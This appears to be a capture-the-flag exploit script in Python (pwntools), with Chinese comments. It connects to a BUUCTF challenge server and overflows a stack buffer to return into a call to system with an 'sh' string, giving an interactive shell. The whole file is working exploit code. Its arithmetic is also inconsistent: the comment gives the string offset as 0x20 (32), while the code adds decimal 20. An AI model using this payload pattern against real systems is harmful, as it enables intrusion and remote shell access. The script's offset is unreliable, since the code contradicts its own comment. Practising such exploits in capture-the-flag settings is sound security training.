from pwn import *

r = remote('node5.buuoj.cn', 27133)

# 不能调用plt因为plt需要返回值，但如果程序中有现成的call函数就可以不用返回值了，因为它会自己把下一条指令给压进去
system_addr = 0x8048529
'''
0x08048650位置的字符串为：/bbbbbbbbin_what_the_f?ck__--??/sh
"sh"的位置距离0x08048650有32个长度，转为hex为0x20
'''
sh_addr = 0x08048650 + 20

payload = b'A' * (0x18+4) + p32(system_addr) + p32(sh_addr)
r.sendafter(b'\n', payload)
r.interactive()
